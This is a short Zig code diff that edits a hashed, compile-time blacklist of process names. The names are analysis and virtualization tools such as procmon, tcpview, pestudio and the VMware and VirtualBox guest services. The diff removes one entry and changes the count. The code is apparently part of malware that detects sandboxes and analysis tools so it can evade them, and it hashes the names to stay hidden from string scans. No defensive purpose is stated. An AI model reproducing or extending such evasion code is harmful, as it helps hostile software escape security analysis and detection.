@@ -4,7 +4,7 @@ const engine = @import("../syscalls/engine.zig");
 const hash = @import("../types/hash.zig");
 const config = @import("config");
 
-const PROC_COUNT: usize = 36;
+const PROC_COUNT: usize = 35;
 
 fn hashName(name: []const u8) u32 {
     var h: u32 = config.SEED;
@@ -30,7 +30,7 @@ const blacklist: [PROC_COUNT]u32 = blk: {
         "httppmon.exe", "tcpview.exe", "vmtoolsd.exe", "vboxservice.exe",
         "vboxtray.exe", "xenservice.exe", "pestudio.exe", "api_monitor.exe",
         "ksdumperclient.exe", "regedit.exe", "httpdebug.exe", "sysinternals.exe",
-        "vmmap.exe", "rammap.exe", "tcpview64.exe", "procmon64.exe",
+        "vmmap.exe", "rammap.exe", "tcpview64.exe",
     };
     var buf: [PROC_COUNT]u32 = undefined;
     for (names, 0..) |n, i| buf[i] = hashName(n);
